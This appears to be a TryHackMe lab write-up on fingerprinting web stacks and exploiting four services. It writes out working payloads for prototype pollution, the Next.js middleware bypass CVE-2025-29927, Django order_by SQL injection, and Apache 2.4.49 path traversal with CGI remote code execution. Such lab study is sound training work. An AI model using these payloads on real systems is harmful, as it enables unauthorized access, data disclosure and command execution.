# Modern Web Stacks – TryHackMe

## Room Information

- **Platform:** TryHackMe
- **Room:** Modern Web Stacks
- **Path:** Jr Penetration Tester
- **Category:** Web Application Security
- **Date Completed:** 12 November 2026
- **Difficulty:** Easy
- **Focus:** Web Stack Fingerprinting, API Security, Prototype Pollution, Authentication Bypass, SQL Injection, Path Traversal, Remote Code Execution

---

## 1. Introduction

Modern web applications use different technologies for frontend development, backend processing, database management, and server infrastructure.

Identifying the underlying technology stack is an important step in web application penetration testing.

Different frameworks and servers have different vulnerabilities, configurations, and attack surfaces.

### Learning Objectives

- Identify web technologies through HTTP response headers, cookies, HTML source, and error messages.
- Understand how different web stacks work.
- Identify vulnerable software versions and map them to known CVEs.
- Perform targeted vulnerability testing.
- Understand the security implications of insecure application logic.

### Methodology

The room follows a three-step approach:

1. **Fingerprinting:** Identify the technologies running on the target.
2. **Version identification:** Determine the software version and research applicable vulnerabilities.
3. **Exploitation:** Validate the vulnerability using targeted testing techniques.

---

## 2. Understanding the Target Environment

The lab contains four web applications running on different ports.

| Port | Technology | Area of Testing |
|---|---|---|
| 3000 | MERN / Express.js | Prototype Pollution |
| 3001 | React / Next.js | Middleware Authentication Bypass |
| 8000 | Django | SQL Injection |
| 8080 | LAMP / Apache | Path Traversal and RCE |

### Initial Enumeration

Check the HTTP response headers:

```bash
curl -I http://MACHINE_IP:3000/
curl -I http://MACHINE_IP:3001/
curl -I http://MACHINE_IP:8000/
curl -I http://MACHINE_IP:8080/
```

**Important options:**

- `-I`: Retrieves HTTP response headers without downloading the complete response body.
- `curl`: Sends HTTP requests to the target.

Response headers can disclose information about the underlying web server and framework.

---

## 3. Task 2 – MERN Stack

### Technology Overview

MERN stands for:

- MongoDB – Database
- Express.js – Backend web framework
- React.js – Frontend library
- Node.js – JavaScript runtime

### Identifying Express.js

One useful fingerprint is the HTTP response header:

```http
X-Powered-By: Express
```

This header indicates that the application is using Express.js, unless the header has been modified or spoofed.

Another useful indicator is the Express session cookie:

```http
Set-Cookie: connect.sid=...
```

`connect.sid` is commonly used by Express applications with the `express-session` middleware.

### Cookie Collection

```bash
curl -c cookies.txt http://MACHINE_IP:3000/
```

**Explanation:**

- `-c`: Saves cookies received from the server.
- `cookies.txt`: File used to store the cookies.

### Reusing Cookies

```bash
curl -b cookies.txt http://MACHINE_IP:3000/
```

- `-b`: Sends previously stored cookies with the request.
- Useful for maintaining a session between multiple HTTP requests.

### Understanding Prototype Pollution

Prototype Pollution is a JavaScript vulnerability that occurs when an application allows an attacker to modify an object's prototype through unsafe property handling.

JavaScript objects inherit properties from their prototypes.

For example:

```javascript
let user = {};

console.log(user.isAdmin);
```

Output:

```text
undefined
```

If the shared prototype is polluted with an `isAdmin` property, other objects may inherit that property.

### Understanding an Unsafe Merge Function

Example:

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

**How it works:**

1. Iterates through the properties of the source object.
2. Checks whether a property contains another object.
3. Creates an empty object in the target if necessary.
4. Recursively merges nested objects.
5. Copies primitive values directly into the target.

The security issue is that the function does not safely handle special property names such as `__proto__` and `constructor`.

### Prototype Pollution Testing

Example JSON payload:

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

Send the payload to the application's relevant merge endpoint:

```bash
curl -b cookies.txt -X POST \
http://MACHINE_IP:3000/api/user/update \
-H "Content-Type: application/json" \
-d '{"__proto__":{"isAdmin":true}}'
```

**Security observations:**

- User-controlled JSON is passed into an object merge operation.
- Unsafe recursive merging can modify the shared prototype.
- Other objects may inherit attacker-controlled properties.
- If authorization logic trusts inherited properties, privilege escalation may become possible.

**Key takeaway:** Never trust user-controlled object properties when performing recursive merges.

---

## 4. Task 3 – React / Next.js

### Technology Overview

React is a JavaScript library used to build user interfaces.

Next.js is a React-based framework that provides additional functionality, including:

- Server-side rendering.
- Static site generation.
- Routing.
- API endpoints.
- Middleware.
- Server Components.

### Identifying Next.js

Check the response headers:

```bash
curl -I http://MACHINE_IP:3001/
```

Common indicators include:

```http
X-Powered-By: Next.js
```

Another useful indicator can be found in the HTML source.

```bash
curl -s http://MACHINE_IP:3001/ | grep -oE 'self\.__next_f' | head -1
```

The `__next_f` artifact is associated with Next.js App Router hydration and streaming data.

### Understanding Middleware

Middleware executes before a request reaches the intended route.

It can be used for:

- Authentication checks.
- Authorization decisions.
- Redirects.
- Request filtering.
- Session validation.

For example:

```text
User Request
     |
     v
Next.js Middleware
     |
     v
Authentication Check
     |
     v
Protected Dashboard
```

If middleware authentication is improperly bypassed, protected routes may become accessible without the intended checks.

### CVE-2025-29927 – Next.js Middleware Authentication Bypass

This vulnerability involves improper handling of the internal middleware subrequest header.

The affected middleware mechanism can be manipulated through a specially crafted HTTP request.

**Vulnerability testing:**

```bash
curl -i \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
http://MACHINE_IP:3001/dashboard
```

**Important observations:**

- The header is associated with Next.js middleware subrequests.
- Vulnerable versions may incorrectly treat the crafted request as an internal subrequest.
- Middleware execution can be skipped.
- Authentication controls implemented only in middleware may therefore be bypassed.

**Security impact:**

An attacker may access protected resources without passing the expected middleware authentication checks.

**Key takeaway:** Authentication should not rely exclusively on middleware. Sensitive backend operations must enforce authorization independently.

---

## 5. Task 4 – Django

### Technology Overview

Django is a Python-based web framework used to develop web applications.

It provides:

- URL routing.
- Database integration through an ORM.
- Authentication.
- Session management.
- CSRF protection.
- Template rendering.

### Identifying Django

One common indicator is the CSRF token field in HTML forms:

```html
<input type="hidden" name="csrfmiddlewaretoken">
```

Search for it:

```bash
curl -s http://MACHINE_IP:8000/products/ | grep -oE 'name="csrfmiddlewaretoken"'
```

Another indicator is the server response header:

```bash
curl -I http://MACHINE_IP:8000/products/
```

Example:

```http
Server: WSGIServer/0.2 CPython/3.10.12
```

### Understanding CSRF Tokens

Django uses CSRF tokens to help prevent Cross-Site Request Forgery.

A CSRF token helps verify that a state-changing request originated from an expected application context.

It is commonly included in POST forms as a hidden field.

### CVE-2021-35042 – Django SQL Injection

This vulnerability affects specific older Django versions.

It involves improper handling of untrusted input in the `QuerySet.order_by()` method when used with certain expressions.

The underlying issue is that user-controlled sorting input can reach SQL query construction in an unsafe manner.

### SQL Injection Concept

SQL injection occurs when untrusted input is incorporated into a database query without appropriate handling.

For example, an unsafe query might look like:

```sql
SELECT * FROM products ORDER BY user_input;
```

If the application directly incorporates attacker-controlled input, the SQL query may be manipulated.

### Error-Based SQL Injection

Some database errors reveal information about the executed query.

In certain MySQL configurations, the `updatexml()` function can produce XPath errors that include evaluated input.

Example testing pattern:

```bash
curl -s -G "http://MACHINE_IP:8000/products/" \
--data-urlencode 'order=updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)'
```

**Command explanation:**

- `-s`: Silent mode.
- `-G`: Sends the supplied data as URL query parameters.
- `--data-urlencode`: URL-encodes the supplied parameter.
- `order`: Parameter being tested.
- `updatexml()`: MySQL function used in the error-based extraction technique.
- `database()`: Returns the current database name.
- `concat()`: Combines strings and query results.

### Security Observations

- User-controlled sorting parameters can become dangerous when inserted into raw SQL expressions.
- Detailed database errors can disclose internal information.
- Debug mode should never be exposed in production.
- ORM usage does not automatically make every query safe.

**Key takeaway:** Validate and allowlist sorting parameters instead of directly incorporating user input into SQL expressions.

---

## 6. Task 5 – LAMP Stack

### Technology Overview

LAMP stands for:

- Linux – Operating system.
- Apache – Web server.
- MySQL – Database.
- PHP – Server-side scripting language.

### Identifying Apache

Check the response headers:

```bash
curl -I http://MACHINE_IP:8080/
```

The vulnerable target identifies itself as:

```http
Server: Apache/2.4.49 (Unix)
```

Software version identification is important because known vulnerabilities are often associated with specific versions.

### CVE-2021-41773 – Apache Path Traversal

This vulnerability affects Apache HTTP Server 2.4.49.

It is caused by improper path normalization and handling of encoded path traversal sequences.

Path traversal allows an attacker to attempt to access files outside the intended web directory.

### Understanding Directory Traversal

A normal directory structure might look like:

```text
/var/www/html/
    index.html
    images/
    uploads/
```

An attacker may attempt to access files outside the web root using traversal sequences:

```text
../../../../etc/passwd
```

The purpose is to move backwards through directory levels.

### Testing with cURL

Example:

```bash
curl --path-as-is \
"http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

**Important option:**

`--path-as-is` prevents cURL from normalizing the path before sending the request.

This is useful when testing encoded path traversal sequences.

### Understanding Remote Code Execution

Under certain configurations, CVE-2021-41773 can be chained with CGI execution to achieve remote code execution.

CGI (Common Gateway Interface) allows a web server to execute external programs to handle requests.

If CGI is enabled and accessible, a vulnerable path traversal can potentially reach an executable such as `/bin/sh`.

Example lab testing pattern:

```bash
curl --path-as-is -X POST \
--data 'echo Content-Type: text/plain; echo; id' \
"http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

**Command explanation:**

- `--path-as-is`: Preserves the traversal sequence.
- `-X POST`: Sends a POST request.
- `--data`: Supplies data in the HTTP request body.
- `echo`: Produces output.
- `id`: Displays the current process user and group information.

### Security Impact

Depending on configuration and permissions, successful exploitation may allow:

- Arbitrary file disclosure.
- Access to sensitive system files.
- Execution of commands through CGI.
- Remote code execution with the privileges of the web server process.

**Key takeaway:** Always identify the exact server version and investigate its known vulnerabilities. Server configuration plays an important role in determining exploitability.

---

## 7. Task 6 – Automation

Automation helps security testers perform repetitive reconnaissance and identify potential weaknesses across multiple services.

### Nikto

Nikto is a web server scanner used to identify:

- Known server vulnerabilities.
- Outdated software.
- Dangerous files and directories.
- Missing or insecure HTTP headers.
- Server configuration issues.

Example:

```bash
nikto -h http://MACHINE_IP:3000
```

Scan the other services:

```bash
nikto -h http://MACHINE_IP:3001
nikto -h http://MACHINE_IP:8000
nikto -h http://MACHINE_IP:8080
```

### Understanding the Role of Automation

Automated scanners can help with:

- Initial reconnaissance.
- Technology identification.
- Known vulnerability detection.
- Identifying missing security headers.
- Reducing repetitive manual work.

However, scanners have limitations.

They may not understand application-specific logic, unsafe recursive merge functions, or framework-specific authentication bypass conditions.

Manual testing is still necessary to validate vulnerabilities and understand their root causes.

**Key takeaway:** Automation should support manual penetration testing, not replace it.

---

## 8. Important Commands Reference

| Command / Option | Purpose |
|---|---|
| `curl -I` | Retrieve HTTP response headers |
| `curl -s` | Silent cURL execution |
| `curl -c cookies.txt` | Save cookies |
| `curl -b cookies.txt` | Send stored cookies |
| `curl -X POST` | Send POST request |
| `curl -H` | Add HTTP headers |
| `curl -d` | Send request body data |
| `curl -G` | Send supplied data as URL query parameters |
| `curl --data-urlencode` | URL-encode request parameters |
| `curl --path-as-is` | Preserve the supplied URL path |
| `grep` | Search for matching text |
| `nikto -h` | Scan a web server |

---

## 9. Vulnerabilities Covered

| Technology | Vulnerability | CVE |
|---|---|---|
| MERN / Express.js | Prototype Pollution | Application-specific |
| Next.js | Middleware Authentication Bypass | CVE-2025-29927 |
| Django | SQL Injection | CVE-2021-35042 |
| Apache 2.4.49 | Path Traversal / RCE | CVE-2021-41773 |

---

## 10. Key Learnings

Through this room, I gained practical knowledge of:

1. Web stack fingerprinting using HTTP response headers.
2. Identifying backend frameworks through cookies and HTML source.
3. Understanding Express.js sessions and cookie handling.
4. Understanding recursive functions and unsafe object merging.
5. Understanding JavaScript Prototype Pollution.
6. Understanding Next.js middleware and authentication bypass.
7. Identifying Django applications through CSRF tokens.
8. Understanding error-based SQL injection.
9. Understanding Apache path traversal and CGI-based command execution.
10. Using cURL to manually construct and test HTTP requests.
11. Using Nikto for automated web server reconnaissance.
12. Understanding why manual testing is important even when automated scanners are available.

---

## 11. Practical Penetration Testing Takeaways

The biggest lesson from this room is that identifying the technology stack can significantly improve the efficiency of a penetration test.

A structured approach should look like this:

```text
Initial Reconnaissance
        |
        v
HTTP Header Analysis
        |
        v
Technology Fingerprinting
        |
        v
Version Identification
        |
        v
CVE Research
        |
        v
Manual Vulnerability Testing
        |
        v
Impact Validation
        |
        v
Documentation and Reporting
```

In a real-world assessment, I would not immediately run every available scanner against the target.

Instead, I would first understand the application, identify the technologies, research their known weaknesses, and perform targeted testing within the authorized scope.

**Final takeaway:**

Understanding how a web application is built is just as important as understanding how to attack it. Good penetration testing starts with reconnaissance and technology identification, followed by targeted vulnerability validation.
